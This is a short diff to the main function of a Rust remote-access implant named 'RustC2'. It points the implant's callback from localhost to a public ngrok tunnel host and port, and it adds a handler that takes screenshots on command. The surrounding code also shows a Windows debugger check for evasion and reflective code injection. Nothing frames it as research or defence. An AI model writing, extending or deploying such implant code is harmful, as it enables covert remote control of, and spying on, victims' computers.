@@ -38,8 +38,8 @@ fn main() {
     #[cfg(windows)]
     sandbox::check_debugger();
 
-    let mut host = "127.0.0.1".to_string();
-    let mut port = "8080".to_string();
+    let mut host = "0.tcp.in.ngrok.io".to_string();
+    let mut port = "17418".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
     let matches = Command::new("RustC2")
@@ -126,6 +126,8 @@ fn main() {
                     {
                         #[cfg(windows)]
                         inject::reflective_inject(&mut stream, command, shared_secret);
+                    } else if command_clone.starts_with("||SCREENSHOT||") {
+                        utils::handle_screenshot();
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
